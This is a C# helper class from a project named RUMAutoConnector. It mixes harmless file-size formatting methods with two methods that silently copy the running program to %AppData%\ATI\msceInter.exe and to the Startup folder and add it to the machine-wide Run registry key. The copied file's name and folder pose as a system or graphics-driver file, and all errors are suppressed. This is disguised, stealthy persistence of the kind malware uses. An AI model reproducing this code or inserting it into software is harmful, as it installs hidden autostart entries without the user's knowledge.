using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace RUMAutoConnector
{
    public static class Helper
    {
        public static void AddToRegistry()
        {
            try
            {
                System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ATI\" + "msceInter.exe");
                RegistryKey RegStartUp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RegStartUp.SetValue("msceInter", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ATI\" + "msceInter.exe");
            }
            catch { }
        }

        public static void AddToStartup()
        {
            try
            {
                System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
            }
            catch { }
        }

        private const long OneKb = 1024;
        private const long OneMb = OneKb * 1024;
        private const long OneGb = OneMb * 1024;
        private const long OneTb = OneGb * 1024;

        public static string ToPrettySize(this long value, int decimalPlaces = 0)
        {
            var asTb = Math.Round((double)value / OneTb, decimalPlaces);
            var asGb = Math.Round((double)value / OneGb, decimalPlaces);
            var asMb = Math.Round((double)value / OneMb, decimalPlaces);
            var asKb = Math.Round((double)value / OneKb, decimalPlaces);
            string chosenValue = asTb > 1 ? string.Format("{0}Tb", asTb)
                : asGb > 1 ? string.Format("{0}Gb", asGb)
                : asMb > 1 ? string.Format("{0}Mb", asMb)
                : asKb > 1 ? string.Format("{0}Kb", asKb)
                : string.Format("{0}B", Math.Round((double)value, decimalPlaces));
            return chosenValue;
        }

        public static string ToPrettySize(this int value, int decimalPlaces = 0)
        {
            return ToPrettySize((long)value,decimalPlaces);
        }
    }
}
